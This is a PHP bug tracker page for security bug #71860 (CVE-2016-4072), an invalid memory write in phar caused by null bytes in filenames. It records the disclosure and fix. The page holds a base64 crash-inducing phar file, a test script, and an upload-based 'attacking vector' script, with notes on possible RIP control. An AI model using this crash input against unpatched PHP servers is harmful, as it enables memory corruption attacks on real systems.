<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #71860 - RDF' href='rss/bug.php?id=71860'>
        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #71860 - RSS 2.0' href='rss/bug.php?id=71860&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #71860 :: Invalid memory write in phar on filename with \0 in name</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=71860">Sec Bug</a>&nbsp;#71860</th>
            <td id="summary" colspan="5">Invalid memory write in phar on filename with \0 in name</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-03-19 18:50 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-04-25 17:07 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=PHAR+related">PHAR related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.5.33</td>
            <th class="details">OS:</th>
            <td>all</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4072" target="_blank">2016-4072</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=71860&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=71860&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=71860&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1458413455">&nbsp;</a><strong>[2016-03-19 18:50 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
tail -f /var/log/kern.log
Mar 19 18:41:33 TZDG001 kernel: [10476143.454202] php[18389]: segfault at ae6572 ip 0000000000d531b4 sp 00007ffea1567a70 error 7 in php[400000+e80000]



(gdb) r  test.php ret/crash13
Starting program: /tmp/php-7.0.4/sapi/cli/php test.php ret/crash13
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

Program received signal SIGSEGV, Segmentation fault.
zend_string_init (persistent=0, len=2, str=0x121a64c &quot;-&gt;&quot;) at /tmp/php-7.0.4/Zend/zend_string.h:157
157		zend_string *ret = zend_string_alloc(len, persistent);
(gdb) i r
rax            0xae6572	11429234
rbx            0x7fffffffa880	140737488332928
rcx            0x64c	1612
rdx            0x2	2
rsi            0x3	3
rdi            0xae658a	11429258
rbp            0x2	0x2
rsp            0x7fffffffa7e0	0x7fffffffa7e0
r8             0xfffffffffffffffb	-5
r9             0x1	1
r10            0x3	3
r11            0x1214fc0	18960320
r12            0x1206b7a	18901882
r13            0x4	4
r14            0x121a64c	18982476
r15            0x7fffffffa880	140737488332928
!!! rip        0xd531b4	0xd531b4 &lt;add_assoc_string_ex+116&gt;
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0


maybe potencial attackers can manipulate rip register and get RCE

Test script:
---------------
cat test.php
-------------------
&lt;?php
$testfile = file_get_contents($argv[1]);
try {
    $phar = new Phar($testfile);
    $phar['index.php'] = '&lt;?php echo &quot;<a href="https://twitter.com/vah_13&quot;;" rel="nofollow">https://twitter.com/vah_13&quot;;</a> ?&gt;';
    $phar['index.phps'] = '&lt;?php echo &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;; ?&gt;';
    $phar-&gt;setStub('&lt;?php
Phar::webPhar();
__HALT_COMPILER(); ?&gt;');
} catch (Exception $e) {
        print $e;
}?&gt;
-------------------


root@TZDG001:/tmp/data2# base64 ret/crash13
CkTJu4AoZHKCxhC7KlDNp2g5Grx7JE092+gDAADJVR1EZS8vL/oAAPovLy8v5y8vLy9lZWVlZWVl
DAwMC+MMDAwMDM4MDAwgBwwMDAwMDAxQDC8uLi8jLy88Ly8u+C8vLxERERERERERpXRDbnQgdGhh
dCBtVnJrV3h4eHh4eNt4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4ePh4Ly8vLy8vLy8vLy8v
Ly8vLy8vLy8vLy8vLkYvLy8vLy8vLy8vLy9kJy8vLy8vLy8vLy8v8+TzMZovLysvLy8vL3l5eXl5
eXl5eXkpIHsEAAYgICAveHh4eHh4eHh4eAF4AAJ4eP8vIExvYWQgY29tbWFuZChTgG5lIHV0aWxp
dHkKICAgIGluY2yKZGUuLi4uLi4uLi4uPCYuLi4ucG1kLnBoYXIudmVKCiAgJCAvLyBSdegDIGxp
bmUgTW50ZXJmYWxlCiAgIBxleGkAAP//SFBNRFxUZXh0VUl5Q29tbWFuZAAANwAAAHNyY1Rf/39N
UElMRVIodjsgPz4MChAAAAANAgAAEP//+QEAAAAAAAAiAAAqAAAAlnJjL21haW4vlA8uLlEvci8u
LhAA2GVzZXRzL2NsZWFucipeTUxSZW5kZXLJYEC2IQAAAABjb3JlrgAAAAAAI2OcwrYAAAAAAA0A
NwAAAHMASRwAc2V0cy91bndzcmMAnjgjW7gwgAAAcmMAAgAAADN1bGVzZXRzL2MgAAAAb///f/9p
YWwueG1s4BIAAB+u4VZzcmMvbWFpbi9yZXNvdXJpZ24ueABzcmMvbQA9dr2itiEASRyXl5eXl5eX
l5etl5eXlwAMc3JjL21hW24v6Bvzb3VyY2VzL3J1//+AAHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0
dHR0dHR0WWV0cy9uYRwcMBwcHBwcHBwcAB+u4TSoCwD1A3lvdXJjZXMvdmVsb2Qxmi9LZ01yAB+u
4RgAACCu4VbjDy5nLnhtbP8vAC4uLjwmLnh4eHh4eHh4eHh4+HgZLy8vLi4ucG1kLnBoL3Jlc291
cmNjZXNzcgCAAAAuGnVzc3IvLg0AAHFF7BMAc3JjL/9haW4vcGhwL1BIUE1EL1BhcnMnJycnJycn
JycnJycnJyfnAAAKQ5bxci5waHBtGAAAH67hGAAAH67hVuMPLi5RLy8vLy8vc3JW4QcAANevurC2
IQAAAAcAACwvdXNyLy4uL1KHAK78Vm4vcGhwL1BIUE1EL1JlbmRlcmVyKl5NTFJlbmRlcslgQLYh
AAAAAAAAGwABAHNyYy9tYWluL3BoNy9QSFBNRC9SdVRlLnCAcDIYAAAfruEAAHNyYy9tYWluL3AA
iy0AAABzcmMAAFeu4VYwCAAAPXa9oi8vLy8vLy8vLy8vLy8vLy8vL28v8+TzOoAAAGhwL1D/CzpE
ZXZlbG9kMZovbmdNZXRob2QQcGiKlgwAIAAAAFb8BQAAI2OcwrYhAAAAACAANwAAAGNyYy9tYc7O
zs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs4AEa7hVnNyYy+A////L9YhzLYhAADg////MXBo
cC9QSFBNRC9PdW1hf24vcGhwL1BIUGFEUFBQUFBQUFByYy9tYWluL3BocC9QSFBNRC9SdWxML0Rl
c2lnZy9Ub29PYW55TWV0aG9kfy4fruFWYy9tYWluL3BocC9QSFBNRC9SdWxlL0Rlc2lnbi8vRGV2
ZWxvZFxlbnRDbwMAAGMvbQA9dr2itiEASRwAcG1kLnARruFWjwUF//8FcIWYAAIAAAAvLi4v////
/3JILi4vLi91c3IvLi4AADYAAABecmMvUEhQTUQvUnVsZS9EZXNpZ1svV2VpAGhwAAAAc3JjLy8v
LwAAAQDk8zGaLy//L1J1bGUvRJCQkJBAkJCQkJDQkJBzkJCQkJCQkJCQkJCQkJCQkG50cm9w6HAu
LgAAAQAuLi4uLi4uLi4uL1BIUE1EL091bWFpdi9waHAvUEhQTURlcgAEQ2hpbGRyZW4ucGhwbQsA
AB+u4VZ+BQAAgLP4+7Yh3////wAOAAAfruxWbQYAADplbi4vdf//Ly4u5i4vdQBkHwAD6AAD6AAN
ADcuLhAA2DUAAAAyAAAAc3JkLy8uLi8uL1Jzci4vdXNycGguUS8vLy9/AAAAL3Vzci+uQi8uL3Vz
ci8vLi98c3IvLhciLi91c3IvLi4vdXOALy4uL/////9ldHMvYyAAAABv//9//2lhbC54tbW1tbW1
tbW1tbW1vABjL+ZJTnUgZC4vc5QPAAAEAHIvLi4vdXNyLy4uLy4vdXNyLy4AZC4vAQAAAC4uL3UQ
AC8uLi8uL3Vzby4vdXNyDy4uUS8vLy8vL3NyLy4vc3IvLi4odXNyAAIAAC4vdXNzci8uLi91e3Iv
rkIvLmRvci9hdRAA2DVXu7YhABcuL3Vzci8uAS8u




</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=71860'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=71860'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1458415928">&nbsp;</a><strong>[2016-03-19 19:32 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>root@TZDG001:/tmp/data2# valgrind -q ../php-7.0.4/sapi/cli/php test.php ret/crash13
==20538== Invalid read of size 8
==20538==    at 0xC70678: zend_mm_alloc_small (zend_alloc.c:1291)
==20538==    by 0xC70678: zend_mm_alloc_heap (zend_alloc.c:1358)
==20538==    by 0xC70678: _emalloc (zend_alloc.c:2442)
==20538==    by 0xC7696F: _estrndup (zend_alloc.c:2565)
==20538==    by 0x76BD95: phar_split_fname (phar.c:2229)
==20538==    by 0x732F19: phar_parse_url (stream.c:74)
==20538==    by 0x747A26: phar_wrapper_open_dir (dirstream.c:315)
==20538==    by 0xBA6BB7: _php_stream_opendir (streams.c:1982)
==20538==    by 0x85DDB2: spl_filesystem_dir_open (spl_directory.c:236)
==20538==    by 0x869E39: spl_filesystem_object_construct (spl_directory.c:724)
==20538==    by 0x869E39: zim_spl_RecursiveDirectoryIterator___construct (spl_directory.c:1563)
==20538==    by 0xCE6370: zend_call_function (zend_execute_API.c:879)
==20538==    by 0xE0662A: zend_call_method (zend_interfaces.c:104)
==20538==    by 0x779BC1: zim_Phar___construct (phar_object.c:1233)
==20538==    by 0x101447C: ZEND_DO_FCALL_SPEC_HANDLER (zend_vm_execute.h:842)
==20538==  Address 0x73752f2e20656c75 is not stack'd, malloc'd or (recently) free'd
==20538== 
==20538== 
==20538== Process terminating with default action of signal 11 (SIGSEGV)
==20538==  General Protection Fault
==20538==    at 0xC70678: zend_mm_alloc_small (zend_alloc.c:1291)
==20538==    by 0xC70678: zend_mm_alloc_heap (zend_alloc.c:1358)
==20538==    by 0xC70678: _emalloc (zend_alloc.c:2442)
==20538==    by 0xC7696F: _estrndup (zend_alloc.c:2565)
==20538==    by 0x76BD95: phar_split_fname (phar.c:2229)
==20538==    by 0x732F19: phar_parse_url (stream.c:74)
==20538==    by 0x747A26: phar_wrapper_open_dir (dirstream.c:315)
==20538==    by 0xBA6BB7: _php_stream_opendir (streams.c:1982)
==20538==    by 0x85DDB2: spl_filesystem_dir_open (spl_directory.c:236)
==20538==    by 0x869E39: spl_filesystem_object_construct (spl_directory.c:724)
==20538==    by 0x869E39: zim_spl_RecursiveDirectoryIterator___construct (spl_directory.c:1563)
==20538==    by 0xCE6370: zend_call_function (zend_execute_API.c:879)
==20538==    by 0xE0662A: zend_call_method (zend_interfaces.c:104)
==20538==    by 0x779BC1: zim_Phar___construct (phar_object.c:1233)
==20538==    by 0x101447C: ZEND_DO_FCALL_SPEC_HANDLER (zend_vm_execute.h:842)
</pre>
</div><div class='comment type_log' ><a name="1458439785">&nbsp;</a><strong>[2016-03-20 02:09 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type:           Bug</span>
<span class="added">+Type:           Security</span>
<span class="removed">-Private report: No</span>
<span class="added">+Private report: Yes</span>
</div></div></div><div class='comment type_comment' ><a name="1458439785">&nbsp;</a><strong>[2016-03-20 02:09 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>...
</pre>
</div><div class='comment type_comment' ><a name="1458531530">&nbsp;</a><strong>[2016-03-21 03:38 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Looks like the source of the issue is in phar_analyze_path, namely in this code:

				if (!(realpath = expand_filepath(filename, NULL))) {
					efree(filename);
					return FAILURE;
				}
#ifdef PHP_WIN32
				phar_unixify_path_separators(realpath, strlen(realpath));
#endif
				slash = strstr(realpath, filename);
				if (slash) {
					slash += ((ext - fname) + ext_len);
					*slash = '\0';
				}

The problem there is that if fname and thus filename contain \0's, which in this example they do, realpath of course would not contain those parts and thus slash would point past the end of the realpath buffer. I think the best solution would be to just reject filenames that contain \0 outright.
</pre>
</div><div class='comment type_comment' ><a name="1458532649">&nbsp;</a><strong>[2016-03-21 03:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Not sure if it's a security issue though as for this to be exploitable the application should allow attacker to create phar files with arbitrary filenames - which pretty much already means full disk access.
</pre>
</div><div class='comment type_log' ><a name="1458532801">&nbsp;</a><strong>[2016-03-21 04:00 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary: null pointer exception phar::webPhar, potential code
          execution</span>
<span class="added">+Summary: Invalid memory write in phar on filename with \0 in
          name</span>
</div></div></div><div class='comment type_log' ><a name="1458533059">&nbsp;</a><strong>[2016-03-21 04:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.0.5RC1</span>
<span class="added">+PHP Version: 5.5.33</span>
</div></div></div><div class='comment type_comment' ><a name="1458533059">&nbsp;</a><strong>[2016-03-21 04:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>happens also in 5.x
</pre>
</div><div class='comment type_log' ><a name="1458535458">&nbsp;</a><strong>[2016-03-21 04:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1458535458">&nbsp;</a><strong>[2016-03-21 04:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fix in security repo as 1e9b175204e3286d64dfd6c9f09151c31b5e099a for 7.0, 72281f29dd4691b2f741362d3581162fcf85f502 for 5.5

Also in <a href="https://gist.github.com/smalyshev/80b5c2909832872f2ba2" rel="nofollow">https://gist.github.com/smalyshev/80b5c2909832872f2ba2</a>
Please verify
</pre>
</div><div class='comment type_comment' ><a name="1458572783">&nbsp;</a><strong>[2016-03-21 15:06 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>ok, fixed
</pre>
</div><div class='comment type_comment' ><a name="1458580369">&nbsp;</a><strong>[2016-03-21 17:12 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>attacking vector without local cli  

&lt;?php

$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
		$testfile = file_get_contents($uploadfile);
	try {
		$phar = new Phar($testfile);
		$phar['index.php'] = '&lt;?php echo &quot;<a href="https://twitter.com/vah_13&quot;;" rel="nofollow">https://twitter.com/vah_13&quot;;</a> ?&gt;';
		$phar['index.phps'] = '&lt;?php echo &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;; ?&gt;';
		$phar-&gt;setStub('&lt;?php
	Phar::webPhar();
	__HALT_COMPILER(); ?&gt;');
	} catch (Exception $e) {
			print $e;
	}
}

?&gt;
</pre>
</div><div class='comment type_comment' ><a name="1458586437">&nbsp;</a><strong>[2016-03-21 18:53 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>here is video 

<a href="https://drive.google.com/file/d/0B7gu5bbuZn2ITk54ZGl5SzVWNlk/view?usp=sharing" rel="nofollow">https://drive.google.com/file/d/0B7gu5bbuZn2ITk54ZGl5SzVWNlk/view?usp=sharing</a>

rash have in new Phar($file) function.
</pre>
</div><div class='comment type_comment' ><a name="1458586744">&nbsp;</a><strong>[2016-03-21 18:59 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>code execution can create, see this doc 

<a href="https://www.exploit-db.com/docs/33698.pdf" rel="nofollow">https://www.exploit-db.com/docs/33698.pdf</a> (0x04 Control RIP)
</pre>
</div><div class='comment type_comment' ><a name="1458589997">&nbsp;</a><strong>[2016-03-21 19:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Of course any CLI script can be converted to one run through the web, that isn't what distinguishes security issues. Anyway, since it has to do with phar filenames and it is possible that at least part of can come from outside, for now I'm treating it as security issue just to be cautious.
</pre>
</div><div class='comment type_comment' ><a name="1458590562">&nbsp;</a><strong>[2016-03-21 20:02 UTC] vvvaagn &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>okay.
commit &amp; merged? :-)
</pre>
</div><div class='comment type_comment' ><a name="1458591959">&nbsp;</a><strong>[2016-03-21 20:25 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Not merged yet. Security issues are merged at release time - which is next week.
</pre>
</div><div class='comment type_svn' ><a name="1459234377">&nbsp;</a><strong>[2016-03-29 06:52 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1e9b175204e3286d64dfd6c9f09151c31b5e099a" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1e9b175204e3286d64dfd6c9f09151c31b5e099a</a>
Log: Fix <a href='bug.php?id=71860'>bug #71860</a>: Require valid paths for phar filenames
</pre>
</div><div class='comment type_log' ><a name="1459234379">&nbsp;</a><strong>[2016-03-29 06:52 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1459234550">&nbsp;</a><strong>[2016-03-29 06:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=72281f29dd4691b2f741362d3581162fcf85f502" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=72281f29dd4691b2f741362d3581162fcf85f502</a>
Log: Fix <a href='bug.php?id=71860'>bug #71860</a>: Require valid paths for phar filenames
</pre>
</div><div class='comment type_svn' ><a name="1459243836">&nbsp;</a><strong>[2016-03-29 09:30 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=72281f29dd4691b2f741362d3581162fcf85f502" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=72281f29dd4691b2f741362d3581162fcf85f502</a>
Log: Fix <a href='bug.php?id=71860'>bug #71860</a>: Require valid paths for phar filenames
</pre>
</div><div class='comment type_svn' ><a name="1459243837">&nbsp;</a><strong>[2016-03-29 09:30 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1e9b175204e3286d64dfd6c9f09151c31b5e099a" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1e9b175204e3286d64dfd6c9f09151c31b5e099a</a>
Log: Fix <a href='bug.php?id=71860'>bug #71860</a>: Require valid paths for phar filenames
</pre>
</div><div class='comment type_log' ><a name="1461604033">&nbsp;</a><strong>[2016-04-25 17:07 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2016-4072</span>
</div></div></div><div class='comment type_svn' ><a name="1469014369">&nbsp;</a><strong>[2016-07-20 11:32 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1e9b175204e3286d64dfd6c9f09151c31b5e099a" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1e9b175204e3286d64dfd6c9f09151c31b5e099a</a>
Log: Fix <a href='bug.php?id=71860'>bug #71860</a>: Require valid paths for phar filenames
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
